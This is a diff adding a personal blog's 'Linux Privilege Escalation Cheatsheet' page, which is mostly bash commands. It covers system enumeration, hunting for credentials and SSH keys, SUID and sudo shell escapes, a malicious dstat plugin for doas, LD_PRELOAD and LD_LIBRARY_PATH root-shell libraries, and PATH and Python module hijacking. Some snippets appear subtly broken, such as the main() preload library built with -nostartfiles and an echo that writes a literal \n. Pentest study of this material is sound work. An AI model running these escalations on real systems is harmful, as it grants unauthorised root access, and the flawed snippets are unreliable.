+                <a href="https://realspaceeagle.github.io/projects/" title="Projects">
+                    <span>Projects</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/contact/" title="Contact">
+                    <span>Contact</span>
+                </a>
+            </li>
+        </ul>
+        
+        
+        <div id="mobile-menu" class="mobile-menu">
+            <ul class="mobile-menu-list">
+                <li>
+                    <a href="https://realspaceeagle.github.io/" title="Home">
+                        <span>Home</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/about/" title="About">
+                        <span>About</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/archives/" title="Archives">
+                        <span>Archives</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/cheatsheets/" title="Cheatsheets">
+                        <span>Cheatsheets</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/search/" title="Search" accesskey=/>
+                        <span>Search</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/tags/" title="Tags">
+                        <span>Tags</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/categories/" title="Categories">
+                        <span>Categories</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/projects/" title="Projects">
+                        <span>Projects</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/contact/" title="Contact">
+                        <span>Contact</span>
+                    </a>
+                </li>
+            </ul>
+        </div>
+    </nav>
+</header>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    const mobileMenuToggle = document.getElementById('mobile-menu-toggle');
+    const mobileMenu = document.getElementById('mobile-menu');
+    const body = document.body;
+    
+    if (mobileMenuToggle && mobileMenu) {
+        mobileMenuToggle.addEventListener('click', function() {
+            const isOpen = mobileMenu.classList.contains('active');
+            
+            if (isOpen) {
+                mobileMenu.classList.remove('active');
+                mobileMenuToggle.classList.remove('active');
+                body.classList.remove('mobile-menu-open');
+            } else {
+                mobileMenu.classList.add('active');
+                mobileMenuToggle.classList.add('active');
+                body.classList.add('mobile-menu-open');
+            }
+        });
+        
+        
+        const mobileMenuLinks = mobileMenu.querySelectorAll('a');
+        mobileMenuLinks.forEach(link => {
+            link.addEventListener('click', function() {
+                mobileMenu.classList.remove('active');
+                mobileMenuToggle.classList.remove('active');
+                body.classList.remove('mobile-menu-open');
+            });
+        });
+        
+        
+        document.addEventListener('click', function(event) {
+            if (!mobileMenu.contains(event.target) && !mobileMenuToggle.contains(event.target)) {
+                mobileMenu.classList.remove('active');
+                mobileMenuToggle.classList.remove('active');
+                body.classList.remove('mobile-menu-open');
+            }
+        });
+    }
+});
+</script><main class="main">
+<link rel="stylesheet" href="/css/cheatsheet-style.css">
+
+<article class="post-single cheatsheet-page">
+  <header class="post-header">
+    <div class="breadcrumbs">
+      <a href="/">Home</a> &nbsp;/&nbsp; <a href="/cheatsheets/">Cheatsheets</a> &nbsp;/&nbsp; Linux Privilege Escalation Cheatsheet
+    </div>
+    <h1 class="post-title">
+      Linux Privilege Escalation Cheatsheet
+    </h1>
+    <div class="post-description">
+      Comprehensive guide for Linux privilege escalation techniques, including doas, sudo misconfigurations, SUID/SGID abuse, and more
+    </div>
+    <div class="post-meta">
+      <span title='January 1, 2024'>
+        January 1, 2024
+      </span>
+      <span class="post-tags">
+        <a href="/tags/linux">#linux</a>
+        <a href="/tags/privilege-escalation">#privilege-escalation</a>
+        <a href="/tags/pentesting">#pentesting</a>
+        <a href="/tags/doas">#doas</a>
+        <a href="/tags/sudo">#sudo</a>
+      </span>
+    </div>
+  </header>
+
+  <div class="post-content"><h1 id="linux-privilege-escalation-cheatsheet">Linux Privilege Escalation Cheatsheet</h1>
+<h2 id="initial-enumeration">Initial Enumeration</h2>
+<h3 id="system-information">System Information</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Basic system info</span>
+</span></span><span class="line"><span class="cl">uname -a
+</span></span><span class="line"><span class="cl">cat /etc/os-release
+</span></span><span class="line"><span class="cl">cat /etc/issue
+</span></span><span class="line"><span class="cl">hostname
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Current user context</span>
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">groups
+</span></span><span class="line"><span class="cl">cat /etc/passwd <span class="p">|</span> grep sh
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Environment variables</span>
+</span></span><span class="line"><span class="cl">env
+</span></span><span class="line"><span class="cl">printenv
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="nv">$PATH</span>
+</span></span></code></pre></div><h3 id="user-and-group-enumeration">User and Group Enumeration</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># List all users</span>
+</span></span><span class="line"><span class="cl">cat /etc/passwd
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Users with login shells</span>
+</span></span><span class="line"><span class="cl">cat /etc/passwd <span class="p">|</span> grep sh
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Current user privileges</span>
+</span></span><span class="line"><span class="cl">sudo -l
+</span></span><span class="line"><span class="cl">find / -user <span class="k">$(</span>whoami<span class="k">)</span> 2&gt;/dev/null <span class="p">|</span> grep -v <span class="s1">&#39;^/proc\|^/run\|^/sys&#39;</span>
+</span></span><span class="line"><span class="cl">find / -group <span class="k">$(</span>whoami<span class="k">)</span> 2&gt;/dev/null <span class="p">|</span> grep -v <span class="s1">&#39;^/proc\|^/run\|^/sys&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Check for interesting group memberships</span>
+</span></span><span class="line"><span class="cl">groups
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Find files owned by current user</span>
+</span></span><span class="line"><span class="cl">find / -user <span class="k">$(</span>id -u<span class="k">)</span> 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">find / -group <span class="k">$(</span>id -g<span class="k">)</span> 2&gt;/dev/null
+</span></span></code></pre></div><hr>
+<h2 id="suid-and-sgid-analysis">SUID and SGID Analysis</h2>
+<h3 id="finding-suidsgid-binaries">Finding SUID/SGID Binaries</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Find SUID binaries</span>
+</span></span><span class="line"><span class="cl">find / -perm -u<span class="o">=</span>s -type f 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">find / -perm -4000 -type f 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Find SGID binaries</span>
+</span></span><span class="line"><span class="cl">find / -perm -g<span class="o">=</span>s -type f 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">find / -perm -2000 -type f 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Find both SUID and SGID</span>
+</span></span><span class="line"><span class="cl">find / -perm -u<span class="o">=</span>s -o -perm -g<span class="o">=</span>s -type f 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Common SUID binaries to check</span>
+</span></span><span class="line"><span class="cl">ls -la /usr/bin/passwd
+</span></span><span class="line"><span class="cl">ls -la /usr/bin/sudo
+</span></span><span class="line"><span class="cl">ls -la /usr/bin/su
+</span></span><span class="line"><span class="cl">ls -la /usr/local/bin/doas
+</span></span></code></pre></div><h3 id="gtfobins-exploitation">GTFOBins Exploitation</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check GTFOBins for binary exploitation</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># https://gtfobins.github.io/</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Common exploitable SUID binaries:</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># - /usr/bin/find</span>
+</span></span><span class="line"><span class="cl">find . -exec /bin/sh -p <span class="se">\;</span> -quit
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># - /usr/bin/vim</span>
+</span></span><span class="line"><span class="cl">vim -c <span class="s1">&#39;:!/bin/sh&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># - /usr/bin/less</span>
+</span></span><span class="line"><span class="cl">less /etc/profile
+</span></span><span class="line"><span class="cl">!/bin/sh
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># - /usr/bin/more</span>
+</span></span><span class="line"><span class="cl">more /etc/profile
+</span></span><span class="line"><span class="cl">!/bin/sh
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># - /usr/bin/nmap (older versions)</span>
+</span></span><span class="line"><span class="cl">nmap --interactive
+</span></span><span class="line"><span class="cl">!sh
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># - /usr/bin/awk</span>
+</span></span><span class="line"><span class="cl">awk <span class="s1">&#39;BEGIN {system(&#34;/bin/sh&#34;)}&#39;</span>
+</span></span></code></pre></div><hr>
+<h2 id="doas-privilege-escalation">doas Privilege Escalation</h2>
+<h3 id="doas-configuration-analysis">doas Configuration Analysis</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Find doas binary and configuration</span>
+</span></span><span class="line"><span class="cl">find / -name doas 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">find / -name doas.conf 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Common doas locations</span>
+</span></span><span class="line"><span class="cl">ls -la /usr/local/bin/doas
+</span></span><span class="line"><span class="cl">ls -la /usr/local/etc/doas.conf
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Check doas configuration</span>
+</span></span><span class="line"><span class="cl">cat /usr/local/etc/doas.conf
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Example vulnerable configuration:</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># permit nopass player as root cmd /usr/bin/dstat</span>
+</span></span></code></pre></div><h3 id="doas-exploitation-techniques">doas Exploitation Techniques</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Basic doas command execution</span>
+</span></span><span class="line"><span class="cl">doas /usr/bin/dstat
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Check what commands are allowed</span>
+</span></span><span class="line"><span class="cl">doas -n /usr/bin/dstat --help
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># If specific command is allowed, look for ways to abuse it</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Example: dstat with custom plugins</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># doas with dstat privilege escalation</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 1. Check if you can write to dstat plugin directory</span>
+</span></span><span class="line"><span class="cl">find / -group <span class="k">$(</span>id -g<span class="k">)</span> 2&gt;/dev/null <span class="p">|</span> grep dstat
+</span></span><span class="line"><span class="cl">ls -la /usr/local/share/dstat
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 2. Create malicious dstat plugin</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;import os; os.execv(&#34;/bin/sh&#34;, [&#34;sh&#34;])&#39;</span> &gt; /usr/local/share/dstat/dstat_exploit.py
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 3. Execute with doas</span>
+</span></span><span class="line"><span class="cl">doas /usr/bin/dstat --exploit
+</span></span></code></pre></div><h3 id="doas-vs-sudo-differences">doas vs sudo Differences</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># doas syntax</span>
+</span></span><span class="line"><span class="cl">doas <span class="nb">command</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># doas with specific user</span>
+</span></span><span class="line"><span class="cl">doas -u root <span class="nb">command</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Check doas configuration syntax</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># permit [options] identity [as target] [cmd command [args ...]]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Common doas misconfigurations:</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># - permit nopass user as root cmd /path/to/binary</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># - Allowing commands that can spawn shells</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># - Wildcard permissions</span>
+</span></span></code></pre></div><hr>
+<h2 id="sudo-privilege-escalation">sudo Privilege Escalation</h2>
+<h3 id="sudo-enumeration">sudo Enumeration</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check sudo privileges</span>
+</span></span><span class="line"><span class="cl">sudo -l
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Check sudo version</span>
+</span></span><span class="line"><span class="cl">sudo --version
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Common sudo misconfigurations:</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># - NOPASSWD entries</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># - Wildcard permissions</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># - Commands that allow shell escapes</span>
+</span></span></code></pre></div><h3 id="sudo-exploitation-examples">sudo Exploitation Examples</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># sudo with shell escape commands</span>
+</span></span><span class="line"><span class="cl">sudo vim
+</span></span><span class="line"><span class="cl">:!/bin/bash
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">sudo less /etc/profile
+</span></span><span class="line"><span class="cl">!/bin/bash
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">sudo find /etc -name <span class="s2">&#34;*.conf&#34;</span> -exec /bin/bash <span class="se">\;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># sudo with environment variables</span>
+</span></span><span class="line"><span class="cl">sudo -E /bin/bash
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># sudo with LD_PRELOAD</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;int main() { setgid(0); setuid(0); system(&#34;/bin/bash&#34;); return 0; }&#39;</span> &gt; /tmp/exploit.c
+</span></span><span class="line"><span class="cl">gcc -fPIC -shared -o /tmp/exploit.so /tmp/exploit.c -nostartfiles
+</span></span><span class="line"><span class="cl">sudo <span class="nv">LD_PRELOAD</span><span class="o">=</span>/tmp/exploit.so /bin/bash
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># sudo with LD_LIBRARY_PATH</span>
+</span></span><span class="line"><span class="cl">mkdir /tmp/lib
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;int main() { setgid(0); setuid(0); system(&#34;/bin/bash&#34;); return 0; }&#39;</span> &gt; /tmp/lib/exploit.c
+</span></span><span class="line"><span class="cl">gcc -fPIC -shared -o /tmp/lib/libc.so.6 /tmp/lib/exploit.c
+</span></span><span class="line"><span class="cl">sudo <span class="nv">LD_LIBRARY_PATH</span><span class="o">=</span>/tmp/lib /bin/bash
+</span></span></code></pre></div><hr>
+<h2 id="writable-directory-exploitation">Writable Directory Exploitation</h2>
+<h3 id="finding-writable-directories">Finding Writable Directories</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Find world-writable directories</span>
+</span></span><span class="line"><span class="cl">find / -type d -perm -002 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Find directories writable by current user</span>
+</span></span><span class="line"><span class="cl">find / -type d -writable 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Find directories owned by current user</span>
+</span></span><span class="line"><span class="cl">find / -type d -user <span class="k">$(</span>whoami<span class="k">)</span> 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Common locations to check</span>
+</span></span><span class="line"><span class="cl">ls -la /tmp
+</span></span><span class="line"><span class="cl">ls -la /var/tmp
+</span></span><span class="line"><span class="cl">ls -la /dev/shm
+</span></span><span class="line"><span class="cl">ls -la /usr/local/share
+</span></span></code></pre></div><h3 id="path-manipulation">PATH Manipulation</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check current PATH</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="nv">$PATH</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Create malicious binary in writable directory</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;#!/bin/bash\n/bin/bash -p&#39;</span> &gt; /tmp/ls
+</span></span><span class="line"><span class="cl">chmod +x /tmp/ls
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Modify PATH to prioritize malicious binary</span>
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Wait for privileged process to execute our binary</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Or trigger execution through cron jobs, scripts, etc.</span>
+</span></span></code></pre></div><h3 id="library-hijacking">Library Hijacking</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check for writable library directories</span>
+</span></span><span class="line"><span class="cl">find / -type d -writable 2&gt;/dev/null <span class="p">|</span> grep -E <span class="s2">&#34;(lib|lib64)&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Check LD_LIBRARY_PATH in processes</span>
+</span></span><span class="line"><span class="cl">ps aux <span class="p">|</span> grep -i ld_library
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Create malicious shared library</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;void _init() { setgid(0); setuid(0); system(&#34;/bin/bash&#34;); }&#39;</span> &gt; /tmp/exploit.c
+</span></span><span class="line"><span class="cl">gcc -fPIC -shared -o /tmp/exploit.so /tmp/exploit.c -nostartfiles
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Place in writable library directory</span>
+</span></span><span class="line"><span class="cl">cp /tmp/exploit.so /writable/lib/directory/
+</span></span></code></pre></div><hr>
+<h2 id="process-and-service-analysis">Process and Service Analysis</h2>
+<h3 id="running-processes">Running Processes</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># List all processes</span>
+</span></span><span class="line"><span class="cl">ps aux
+</span></span><span class="line"><span class="cl">ps -ef --forest
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Processes running as root</span>
+</span></span><span class="line"><span class="cl">ps aux <span class="p">|</span> grep root
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Network connections</span>
+</span></span><span class="line"><span class="cl">ss -tlnp
+</span></span><span class="line"><span class="cl">netstat -tulnp
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Check for processes with interesting capabilities</span>
+</span></span><span class="line"><span class="cl">/sbin/getcap -r / 2&gt;/dev/null
+</span></span></code></pre></div><h3 id="cron-jobs-and-scheduled-tasks">Cron Jobs and Scheduled Tasks</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># System cron jobs</span>
+</span></span><span class="line"><span class="cl">cat /etc/crontab
+</span></span><span class="line"><span class="cl">ls -la /etc/cron.*
+</span></span><span class="line"><span class="cl">crontab -l
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># User cron jobs</span>
+</span></span><span class="line"><span class="cl">crontab -l
+</span></span><span class="line"><span class="cl">cat /var/spool/cron/crontabs/*
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Systemd timers</span>
+</span></span><span class="line"><span class="cl">systemctl list-timers
+</span></span><span class="line"><span class="cl">find /etc/systemd -name <span class="s2">&#34;*.timer&#34;</span>
+</span></span></code></pre></div><h3 id="services-and-sockets">Services and Sockets</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Running services</span>
+</span></span><span class="line"><span class="cl">systemctl list-units --type<span class="o">=</span>service --state<span class="o">=</span>running
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Check service files for misconfigurations</span>
+</span></span><span class="line"><span class="cl">find /etc/systemd -name <span class="s2">&#34;*.service&#34;</span> -exec grep -l <span class="s2">&#34;User\|Group&#34;</span> <span class="o">{}</span> <span class="se">\;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Socket files</span>
+</span></span><span class="line"><span class="cl">systemctl list-units --type<span class="o">=</span>socket
+</span></span><span class="line"><span class="cl">find /etc/systemd -name <span class="s2">&#34;*.socket&#34;</span>
+</span></span></code></pre></div><hr>
+<h2 id="file-system-analysis">File System Analysis</h2>
+<h3 id="configuration-files">Configuration Files</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check for readable sensitive files</span>
+</span></span><span class="line"><span class="cl">find /etc -readable -type f 2&gt;/dev/null <span class="p">|</span> head -20
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Database configuration files</span>
+</span></span><span class="line"><span class="cl">find / -name <span class="s2">&#34;*.conf&#34;</span> -o -name <span class="s2">&#34;*.config&#34;</span> -o -name <span class="s2">&#34;*.cfg&#34;</span> 2&gt;/dev/null <span class="p">|</span> grep -E <span class="s2">&#34;(sql|db|database)&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Web application configs</span>
+</span></span><span class="line"><span class="cl">find / -name <span class="s2">&#34;wp-config.php&#34;</span> -o -name <span class="s2">&#34;config.php&#34;</span> -o -name <span class="s2">&#34;.env&#34;</span> 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># SSH keys and certificates</span>
+</span></span><span class="line"><span class="cl">find / -name <span class="s2">&#34;id_rsa&#34;</span> -o -name <span class="s2">&#34;id_dsa&#34;</span> -o -name <span class="s2">&#34;*.pem&#34;</span> -o -name <span class="s2">&#34;*.key&#34;</span> 2&gt;/dev/null
+</span></span></code></pre></div><h3 id="log-files">Log Files</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># System logs</span>
+</span></span><span class="line"><span class="cl">find /var/log -readable -type f 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Application logs</span>
+</span></span><span class="line"><span class="cl">find / -name <span class="s2">&#34;*.log&#34;</span> -readable 2&gt;/dev/null <span class="p">|</span> head -10
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Check logs for passwords or sensitive information</span>
+</span></span><span class="line"><span class="cl">grep -r -i <span class="s2">&#34;password\|passwd\|secret\|token&#34;</span> /var/log/ 2&gt;/dev/null
+</span></span></code></pre></div><h3 id="backup-files">Backup Files</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Find backup files</span>
+</span></span><span class="line"><span class="cl">find / -name <span class="s2">&#34;*.bak&#34;</span> -o -name <span class="s2">&#34;*.backup&#34;</span> -o -name <span class="s2">&#34;*.old&#34;</span> -o -name <span class="s2">&#34;*~&#34;</span> 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Database backups</span>
+</span></span><span class="line"><span class="cl">find / -name <span class="s2">&#34;*.sql&#34;</span> -o -name <span class="s2">&#34;*.dump&#34;</span> -o -name <span class="s2">&#34;*.db&#34;</span> 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Configuration backups</span>
+</span></span><span class="line"><span class="cl">find /etc -name <span class="s2">&#34;*.bak&#34;</span> -o -name <span class="s2">&#34;*.old&#34;</span> -o -name <span class="s2">&#34;*.orig&#34;</span> 2&gt;/dev/null
+</span></span></code></pre></div><hr>
+<h2 id="application-specific-exploits">Application-Specific Exploits</h2>
+<h3 id="dstat-plugin-exploitation">dstat Plugin Exploitation</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check dstat plugin directories</span>
+</span></span><span class="line"><span class="cl">find / -name <span class="s2">&#34;*dstat*&#34;</span> -type d 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">ls -la /usr/share/dstat
+</span></span><span class="line"><span class="cl">ls -la /usr/local/share/dstat
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Check permissions on plugin directory</span>
+</span></span><span class="line"><span class="cl">ls -la /usr/local/share/dstat
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Create malicious dstat plugin</span>
+</span></span><span class="line"><span class="cl">cat &gt; /usr/local/share/dstat/dstat_exploit.py <span class="s">&lt;&lt; &#39;EOF&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s">import os
+</span></span></span><span class="line"><span class="cl"><span class="s">os.execv(&#34;/bin/sh&#34;, [&#34;sh&#34;])
+</span></span></span><span class="line"><span class="cl"><span class="s">EOF</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Execute with doas/sudo</span>
+</span></span><span class="line"><span class="cl">doas /usr/bin/dstat --exploit
+</span></span></code></pre></div><h3 id="python-library-hijacking">Python Library Hijacking</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check Python path</span>
+</span></span><span class="line"><span class="cl">python -c <span class="s2">&#34;import sys; print(&#39;\n&#39;.join(sys.path))&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Find writable Python directories</span>
+</span></span><span class="line"><span class="cl">python -c <span class="s2">&#34;import sys; print(&#39;\n&#39;.join([p for p in sys.path if __import__(&#39;os&#39;).access(p, __import__(&#39;os&#39;).W_OK)]))&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Create malicious module</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;import os; os.execv(&#34;/bin/sh&#34;, [&#34;sh&#34;])&#39;</span> &gt; /writable/python/path/exploit.py
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Import in vulnerable application</span>
+</span></span><span class="line"><span class="cl">python -c <span class="s2">&#34;import exploit&#34;</span>
+</span></span></code></pre></div><h3 id="binary-wrapper-exploitation">Binary Wrapper Exploitation</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Create wrapper script for allowed commands</span>
+</span></span><span class="line"><span class="cl">cat &gt; /tmp/malicious_script <span class="s">&lt;&lt; &#39;EOF&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="s">/bin/bash -p
+</span></span></span><span class="line"><span class="cl"><span class="s">EOF</span>
+</span></span><span class="line"><span class="cl">chmod +x /tmp/malicious_script
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># If PATH manipulation is possible</span>
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Or create binary with same name as allowed command</span>
